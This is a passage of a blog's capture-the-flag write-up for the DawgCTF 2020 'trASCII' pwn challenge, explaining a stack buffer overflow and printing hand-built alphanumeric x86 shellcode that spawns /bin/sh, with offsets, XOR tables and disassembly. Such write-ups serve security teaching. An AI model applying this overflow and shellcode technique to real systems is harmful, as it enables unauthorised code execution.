+<h4 id="executable-trash"><a href="#executable-trash" class="headerlink" title="executable trash"></a>executable trash</h4><p>Well… the <code>trash</code> in this binary in not recyclable but executable…</p>
+<p><a href="http://image.taqini.space/img/20200413173810.png" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/20200413173810.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p>and some address in <code>trash</code> ,for example <code>0x50315934</code>, can be converted to ascii:</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: addr = <span class="number">0x50315734</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: p32(addr)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'4W1P'</span></span><br></pre></td></tr></table></figure></div>
+
+<p>so we can design <em>ascii shellcode</em> in <code>trash</code> and  <em>ret2trash</em> by bof</p>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><h4 id="ret2trash"><a href="#ret2trash" class="headerlink" title="ret2trash"></a>ret2trash</h4><p>Our goal is overwriting return address with <code>4W1P</code>  ,so first of all, we should get the offset of bof. </p>
+<p>generate trash by <code>cyclic(2000)</code>:</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> cyclic 2000</span></span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabr......</span><br></pre></td></tr></table></figure></div>
+
+<p>send it to the program in <code>gdb</code> and watch the return address:</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  0x80493ce &lt;compact+508&gt;    pop    ebp</span><br><span class="line">► 0x80493cf &lt;compact+509&gt;    ret    &lt;0x31753361&gt;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p> 0x31753361 -&gt; <strong>a3u1</strong></p>
+</blockquote>
+<p><a href="http://image.taqini.space/img/20200413180046.png" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/20200413180046.png" src="/img/loading.gif" class="lazyload"></a></p>
+<blockquote>
+<p> we can find the offset by searching <code>aaau</code> from trash</p>
+</blockquote>
+<p>Now the return address is overwritten to <code>a3u1</code>, but our goal is <code>4W1P</code>.</p>
+<p>So we should make sure that the first char of return address is a <strong>digit</strong>, not a letter.</p>
+<p>the trash should be:</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">off_ret = <span class="string">'0000000000'</span>+<span class="string">'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasXXXXWP'</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>…a3s1X<strong>4W1P</strong>1</p>
+</blockquote>
+<p>send it and watch return address again:</p>
+<p><a href="http://image.taqini.space/img/20200413181531.png" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/20200413181531.png" src="/img/loading.gif" class="lazyload"></a></p>
+<blockquote>
+<p>0x50315734 -&gt; <strong>4W1P</strong></p>
+</blockquote>
+<p>No problem! We can puts shellcode into <code>trash+1300</code> now.</p>
+<h4 id="ascii-shellcode"><a href="#ascii-shellcode" class="headerlink" title="ascii shellcode"></a>ascii shellcode</h4><p>Use the same method to get the offset of base address of shellcode:</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">off_shellcode = </span><br><span class="line"><span class="string">'0000000000'</span>+<span class="string">'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaai'</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Designing ascii shellcode was a long but interesting process… </p>
+<blockquote>
+<p>Reference: <a href="https://web.archive.org/web/20110716082827" target="_blank" rel="noopener">Hacking/Shellcode/Alphanumeric/x86 printable opcodes</a></p>
+</blockquote>
+<p>Some useful ascii shellcode are as follows:</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># h4W1P - push   0x50315734                # + pop eax -&gt; set eax</span></span><br><span class="line"><span class="comment"># 5xxxx - xor    eax, xxxx                 # use xor to generate string</span></span><br><span class="line"><span class="comment"># j1X41 - eax &lt;- 0                         # clear eax</span></span><br><span class="line"><span class="comment"># 1B2   - xor    DWORD PTR [edx+0x32], eax # assign value to shellcode</span></span><br><span class="line"><span class="comment"># 2J2   - xor    cl, BYTE PTR [edx+0x32]   # nop</span></span><br><span class="line"><span class="comment"># 41    - xor al, 0x31                     # nop</span></span><br><span class="line"><span class="comment"># X     - pop    eax</span></span><br><span class="line"><span class="comment"># P     - push   eax</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And my ascii shellcode is as follows:</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode</span></span><br><span class="line">nop = <span class="string">'P5L1U1X3B2'</span></span><br><span class="line">nop10 = <span class="string">'P5L1U1X2J2'</span></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode+= <span class="string">'j1X41H40f56b40f57Z40f53G40h4Y1P40Z40Y1B2'</span> <span class="comment"># int 0x80 -&gt; [edx+0x32]</span></span><br><span class="line">shellcode+= <span class="string">'h1b11X5b1i15b11n2J2H2J2H'</span>+<span class="string">'40h2Z1P40[1C2'</span> <span class="comment"># /bin -&gt; [ebx+0x32]</span></span><br><span class="line">shellcode+= <span class="string">'h1w11X5w1A151X2P5X118'</span>+<span class="string">'Y1C6Y40'</span> <span class="comment"># //sh -&gt; [ebx+0x36]</span></span><br><span class="line">shellcode+= <span class="string">'C2K2'</span>*<span class="number">0x32</span> <span class="comment"># inc ebx -&gt; /bin//sh</span></span><br><span class="line">shellcode+= <span class="string">'j4X4t'</span> <span class="comment"># eax=64</span></span><br><span class="line">shellcode+= <span class="string">'2J8H'</span>*<span class="number">53</span> + <span class="string">'2J22K2'</span> <span class="comment"># dec eax -&gt; 0xb</span></span><br><span class="line">shellcode+= nop10*<span class="number">1</span> </span><br><span class="line">shellcode+= <span class="string">'P41j1X41P41Y41P41Z41X'</span>+<span class="string">'2K2'</span> <span class="comment"># ecx&lt;-0 edx&lt;-0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>I don’t want to explain all the shellcode… you can analyze them by <code>disasm()</code></p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">print</span> disasm(<span class="string">'h1b11X5b1i15b11n2J2H2J2H'</span>)</span><br><span class="line">   <span class="number">0</span>:   <span class="number">68</span> <span class="number">31</span> <span class="number">62</span> <span class="number">31</span> <span class="number">31</span>          push   <span class="number">0x31316231</span></span><br><span class="line">   <span class="number">5</span>:   <span class="number">58</span>                      pop    eax</span><br><span class="line">   <span class="number">6</span>:   <span class="number">35</span> <span class="number">62</span> <span class="number">31</span> <span class="number">69</span> <span class="number">31</span>          xor    eax, <span class="number">0x31693162</span></span><br><span class="line">   b:   <span class="number">35</span> <span class="number">62</span> <span class="number">31</span> <span class="number">31</span> <span class="number">6</span>e          xor    eax, <span class="number">0x6e313162</span></span><br><span class="line">  <span class="number">10</span>:   <span class="number">32</span> <span class="number">4</span>a <span class="number">32</span>                xor    cl, BYTE PTR [edx+<span class="number">0x32</span>]</span><br><span class="line">  <span class="number">13</span>:   <span class="number">48</span>                      dec    eax</span><br><span class="line">  <span class="number">14</span>:   <span class="number">32</span> <span class="number">4</span>a <span class="number">32</span>                xor    cl, BYTE PTR [edx+<span class="number">0x32</span>]</span><br><span class="line">  <span class="number">17</span>:   <span class="number">48</span>                      dec    eax</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p> see <a href="#More">details</a> about string generation by ascii shellcode.</p>
+</blockquote>
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>Finally call <code>sys_execve(&quot;/bin/sh&quot;)</code> to getshell</p>
+<p><a href="http://image.taqini.space/img/20200413192057.png" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="http://image.taqini.space/img/20200413192057.png" src="/img/loading.gif" class="lazyload"></a></p>
+<h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>You can download full exp from my <a href="https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/trASCII" target="_blank" rel="noopener">github</a> </p>
+<h4 id="Some-techniques"><a href="#Some-techniques" class="headerlink" title="Some techniques"></a>Some techniques</h4><p>There are some techniques about generating string by ascii shellcode:</p>
+<p>Ascii shellcode for generating string is as follows:</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>opcode(in ascii)</strong></th>
+<th align="center"><strong>assembly instructions</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">hxxxx</td>
+<td align="center">push xxxx</td>
+</tr>
+<tr>
+<td align="center">5xxxx</td>
+<td align="center">xor eax, xxxx</td>
+</tr>
+<tr>
+<td align="center">X</td>
+<td align="center">pop eax</td>
+</tr>
+<tr>
+<td align="center">H</td>
+<td align="center">dec eax</td>
+</tr>
+</tbody></table>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Example1: generating ‘<code>/bin</code>‘</p>
+<ol>
+<li>List a table of string generated by XOR</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>target</th>
+<th align="left"><strong>1</strong></th>
+<th align="left"><strong>b</strong></th>
+<th align="left"><strong>i</strong></th>
+<th align="left"><strong>n</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>tmp1</td>
+<td align="left">1</td>
+<td align="left">b</td>
+<td align="left">1</td>
+<td align="left">1</td>
+</tr>
+<tr>
+<td>tmp2</td>
+<td align="left">b</td>
+<td align="left">1</td>
+<td align="left">i</td>
+<td align="left">1</td>
+</tr>
+<tr>
+<td>tmp3</td>
+<td align="left">b</td>
+<td align="left">1</td>
+<td align="left">1</td>
+<td align="left">n</td>
+</tr>
+</tbody></table>
+<ol start="2">
+<li>set <code>eax</code> to <code>1bin</code> with ascii shellcode </li>
+</ol>
+<table>
+<thead>
+<tr>
+<th align="left">ascii</th>
+<th align="left">instructions</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">h1b11</td>
+<td align="left">push   0x31316231</td>
+</tr>
+<tr>
+<td align="left">X</td>
+<td align="left">pop    eax</td>
+</tr>
+<tr>
+<td align="left">5b1i1</td>
+<td align="left">xor    eax, 0x31693162</td>
+</tr>
+<tr>
+<td align="left">5b11n</td>
+<td align="left">xor    eax, 0x6e313162</td>
+</tr>
+</tbody></table>
+<ol start="3">
+<li><p>generate <code>/bin</code> from <code>1bin</code> </p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">           ; eax &#x3D; 1bin</span><br><span class="line">dec eax    ; eax &#x3D; 0bin</span><br><span class="line">dec eax    ; eax &#x3D; &#x2F;bin</span><br></pre></td></tr></table></figure></div>
+
+</li>
+</ol>
+<p>Example2: generating ‘<code>//sh</code>‘</p>
+<ol>
+<li>List a table of string generated by XOR</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th align="left">target</th>
+<th align="left"><strong>/</strong></th>
+<th align="left"><strong>/</strong></th>
+<th align="left"><strong>s</strong></th>
+<th align="left"><strong>h</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">tmp1</td>
+<td align="left">1</td>
+<td align="left">w</td>
+<td align="left">1</td>
+<td align="left">P</td>
+</tr>
+<tr>
+<td align="left">tmp2</td>
+<td align="left">w</td>
+<td align="left">1</td>
+<td align="left">A</td>
+<td align="left">1</td>
+</tr>
+<tr>
+<td align="left">tmp3</td>
+<td align="left">1</td>
+<td align="left">X</td>
+<td align="left">1</td>
+<td align="left">8</td>
+</tr>
+<tr>
+<td align="left">tmp4</td>
+<td align="left">X</td>
+<td align="left">1</td>
+<td align="left">2</td>
+<td align="left">1</td>
+</tr>
+</tbody></table>
+<ol start="2">
+<li>set <code>eax</code> to <code>//sh</code> with ascii shellcode </li>
+</ol>
+<table>
+<thead>
+<tr>
+<th align="left">ascii</th>
+<th align="left">instructions</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">h1w11</td>
+<td align="left">push   0x31317731</td>
+</tr>
+<tr>
+<td align="left">X</td>
+<td align="left">pop    eax</td>
+</tr>
+<tr>
+<td align="left">5w1A1</td>
+<td align="left">xor    eax, 0x31413177</td>
+</tr>
+<tr>
+<td align="left">51X2P</td>
+<td align="left">xor    eax, 0x50325831</td>
+</tr>
+<tr>
+<td align="left">5X118</td>
+<td align="left">xor    eax, 0x38313158</td>
+</tr>
+</tbody></table>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:742954809@qq.com">TaQini</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://taqini.space/2020/04/13/DawgCTF-2020-Pwn-trASCII-Writeup/">http://taqini.space/2020/04/13/DawgCTF-2020-Pwn-trASCII-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://taqini.space">TaQini</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn    </a><a class="post-meta__tags" href="/tags/bof/">bof    </a><a class="post-meta__tags" href="/tags/shellcode/">shellcode    </a><a class="post-meta__tags" href="/tags/ascii-shellcode/">ascii shellcode    </a></div><div class="post_share"><div class="social-share" data-image="http://image.taqini.space/img/dawg.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/wechat.png" alt="Wechat"><div class="post-qr-code__desc">Wechat</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/alipay.jpg" alt="Alipay"><div class="post-qr-code__desc">Alipay</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2020/04/13/DawgCTF-2020-Pwn-Writeup/"><img class="next_cover lazyload" data-src="http://image.taqini.space/img/dawg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>DawgCTF2020 Pwn Writeup</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/04/08/TG-Hack-CTF-Pwn-writeup/" title="TG:Hack2020 CTF Pwn writeup"><img class="relatedPosts_cover lazyload"data-src="http://image.taqini.space/img/20200408022055.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-04-14</div><div class="relatedPosts_title">TG:Hack2020 CTF Pwn writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2020/03/30/WUST-CTF2020-pwn-wp/" title="WUST-CTF2020-Writeup~"><img class="relatedPosts_cover lazyload"data-src="http://image.taqini.space/img/20200330184135.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-04-07</div><div class="relatedPosts_title">WUST-CTF2020-Writeup~</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/13/ACTF2020-writeup/" title="ACTF2020 writeup"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200213172719.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-04-07</div><div class="relatedPosts_title">ACTF2020 writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2020/04/13/DawgCTF-2020-Pwn-Writeup/" title="DawgCTF2020 Pwn Writeup"><img class="relatedPosts_cover lazyload"data-src="http://image.taqini.space/img/dawg.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-04-13</div><div class="relatedPosts_title">DawgCTF2020 Pwn Writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2020/04/05/AUCTF-2020-pwn-wp/" title="AUCTF 2020 Pwn Writeup"><img class="relatedPosts_cover lazyload"data-src="http://image.taqini.space/img/20200405230852.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-04-07</div><div class="relatedPosts_title">AUCTF 2020 Pwn Writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2020/03/23/bjd2nd-pwn-offical-wp/" title="第二届 BJDCTF 2020 Pwn Writeup (半官方)"><img class="relatedPosts_cover lazyload"data-src="http://image.taqini.space/img/bjd2nd.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-04-07</div><div class="relatedPosts_title">第二届 BJDCTF 2020 Pwn Writeup (半官方)</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = true == true ? true : false;
+var verify = true == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'Tu31dQ33uvFY2kl0vb9CUB2G-gzGzoHsz',
+  appKey:'zG8YkmUIiJdhdwPnJUglqERS',
+  placeholder:'留下你的小脚印吧~',
+  avatar:'monsterid',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang:'zh-cn',
+  recordIP: true
+});</script></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By TaQini</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="footer_custom_text">欢迎来到我的博客~</div><div class="icp"><a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"><span>京ICP备20005724号-1</span></a></div><!--iframe(frameborder='no' border='0' marginwidth='0' marginheight='0' width=240 height=120 src="//music.163.com/outchain/player?type=0&id=4935952990&auto=1&height=90")--><!-- Matomo Image Tracker--><img src="http://ma.taqini.space/matomo.php?idsite=1&amp;rec=1" style="border:0" alt=""><!-- End Matomo--></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-share" id="weixin" title="微信分享"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="http://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/fireworks.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script id="ribbon_piao" mobile="false" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"position":"left","width":150,"height":300,"hOffset":20,"vOffset":-90},"mobile":{"show":true,"scale":1},"react":{"opacityDefault":0.3,"opacityOnHover":0.3,"opacity":0.95},"log":false});</script></body></html>
